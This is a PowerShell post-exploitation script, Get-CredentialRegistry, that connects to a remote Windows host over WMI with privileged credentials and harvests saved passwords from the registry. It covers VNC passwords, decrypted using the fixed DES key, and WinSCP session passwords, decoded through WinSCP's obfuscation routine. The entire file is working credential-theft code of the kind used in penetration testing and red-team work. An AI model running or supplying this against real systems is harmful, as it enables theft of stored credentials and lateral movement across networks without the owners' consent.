#requires -version 3

function Get-CredentialRegistry {
<#
.SYNOPSIS
    Get credentials from registry keys located on a remote computer.
    Privileges required: high

    Author: Timothée MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-CredentialRegistry enumerates registry keys containing credentials on a remote host through WMI.

.PARAMETER ComputerName
    Specifies the target host.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER Ping
    Ensures host is up before run.

.PARAMETER Protocol
    Specifies the protocol to use.

.EXAMPLE
    PS C:\> Get-CredentialRegistry -ComputerName SRV.ADATUM.CORP -Credential ADATUM\Administrator
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty,

        [Switch]
        $Ping,

        [ValidateSet('Dcom', 'Wsman')]
        [String]
        $Protocol = 'Dcom'
    )

    BEGIN {
        if ($Ping -and -not $(Test-Connection -Count 1 -Quiet -ComputerName $ComputerName)) {
            Write-Verbose "[$ComputerName] Host is unreachable."
            break
        }

        $cimOption = New-CimSessionOption -Protocol $Protocol
        $psOption = New-PSSessionOption -NoMachineProfile
        try {
            if ($Credential.Username) {
                $cimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
            else {
                $cimSession = New-CimSession -ComputerName $ComputerName -SessionOption $cimOption -ErrorAction Stop -Verbose:$false
            }
        }
        catch [Microsoft.Management.Infrastructure.CimException] {
            Write-Verbose "[$ComputerName] Failed to establish CIM session."
            break
        }
    }

    PROCESS {

        # Common credential registry keys

        Get-VncCredentialRegistry -CimSession $cimSession

        # User credential registry keys

        [uint32]$HKU = 2147483651
        $SIDS = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=''} -CimSession $cimSession -Verbose:$false | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}
        foreach ($SID in $SIDs) {
            Get-VncCredentialRegistry -CimSession $cimSession -SID $SID
            Get-WinScpCredentialRegistry -CimSession $cimSession -SID $SID
        }
    }

    END {
        Remove-CimSession -CimSession $cimSession
    }
}

function Local:Get-VncCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [String]
        $SID
    )

    BEGIN {
        function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
            if ($EncryptedPassword.Length -lt 8) {
                return ""
            }
            [byte[]] $seed = (23, 82, 107, 6, 35, 78, 88, 7)
            $key = New-Object byte[] $seed.Length
            for ($i = 0; $i -lt 8; $i++) {
                $key[$i] = (
                    (($seed[$i] -band 0x01) -shl 7) -bor
                    (($seed[$i] -band 0x02) -shl 5) -bor
                    (($seed[$i] -band 0x04) -shl 3) -bor
                    (($seed[$i] -band 0x08) -shl 1) -bor
                    (($seed[$i] -band 0x10) -shr 1) -bor
                    (($seed[$i] -band 0x20) -shr 3) -bor
                    (($seed[$i] -band 0x40) -shr 5) -bor
                    (($seed[$i] -band 0x80) -shr 7)
                )
            }
            $des = New-Object Security.Cryptography.DESCryptoServiceProvider
            $des.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
            return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
        }

        function Local:HexStringToByteArray ([string] $HexString) {    
            $byteArray = New-Object Byte[] ($HexString.Length/2);
            for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
            }
            return @( ,$byteArray)
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        [uint32]$HKLM = 2147483650
        [uint32]$HKU = 2147483651
        $commonKeys = @(
            "\SOFTWARE\RealVNC\WinVNC4"
            "\SOFTWARE\TigerVNC\WinVNC4"
            "\SOFTWARE\TightVNC\Server"
            "\SOFTWARE\RealVNC\vncserver"
        )

        $hive = $HKLM
        foreach ($location in $commonKeys) {
            if ($SID) {
                $hive = $HKU
                $location = $SID + $location
            }
            $password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).sValue
            if ($password) {
                $password = Get-VncDecryptedPassword(HexStringToByteArray($password))
                $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="PortNumber"} -CimSession $cimSession -Verbose:$false).sValue
                if(-not $port) {
                    $port = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$hive; sSubKeyName=$location; sValueName="RfbPort"} -CimSession $cimSession -Verbose:$false).sValue
                }
                $obj = New-Object -TypeName psobject
                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Port=$port; Password=$password})
                Write-Output $obj
            }
        }
    }

    END {}
}

function Local:Get-WinScpCredentialRegistry {
    Param (
        [Parameter(Mandatory = $True)]
        [CimSession]
        $CimSession,

        [Parameter(Mandatory = $True)]
        [String]
        $SID
    )

    BEGIN {
        function Local:DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {
            $CheckFlag = 255
            $Magic = 163
            $len = 0
            $key =  $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP($Password)
            $storedFlag = $values.flag 
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP($values.remainingPass)
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP($values.remainingPass)
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i=0; $i -lt $len; $i++) {
                $values = (DecryptNextCharacterWinSCP($values.remainingPass))
                $finalOutput += [char]$values.flag
            }

            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.length)
            }

            return $finalOutput
        }

        function Local:DecryptNextCharacterWinSCP($remainingPass) {
            # Creates an object with flag and remainingPass properties
            $flagAndPass = "" | Select-Object -Property flag,remainingPass
            # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }

        $ComputerName = $CimSession.ComputerName
    }

    PROCESS {
        [uint32]$HKU = 2147483651
        $regKey = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $sessions = Invoke-CimMethod -Class 'StdRegProv' -Name 'EnumKey' -Arguments @{hDefKey=$HKU; sSubKeyName=$regKey} -CimSession $cimSession -Verbose:$false
        if (($sessions | Select-Object -ExpandProperty ReturnValue) -eq 0) {
            $sessions = $sessions | Select-Object -ExpandProperty sNames
            foreach ($session in $sessions) {
                $location = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\" + $session
                $hostname = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="HostName"} -CimSession $cimSession -Verbose:$false).sValue
                $username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="UserName"} -CimSession $cimSession -Verbose:$false).sValue
                $password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$location; sValueName="Password"} -CimSession $cimSession -Verbose:$false).sValue
                if ($password) {
                    $key = $SID + "\SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security"
                    $masterPassUsed = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetDWordValue' -Arguments @{hDefKey=$HKU; sSubKeyName=$key; sValueName="UseMasterPassword"} -CimSession $cimSession -Verbose:$false).uValue
                    if (!$masterPassUsed) {
                        $password = (DecryptWinSCPPassword $hostname $username $password)
                        $obj = New-Object -TypeName psobject
                        $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
                        $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinSCP'
                        $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
                        $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value ([pscustomobject]@{Hostname=$hostname; Username=$username; Password=$password})
                        Write-Output $obj
                    }
                }
            }
        }
    }

    END {}
}
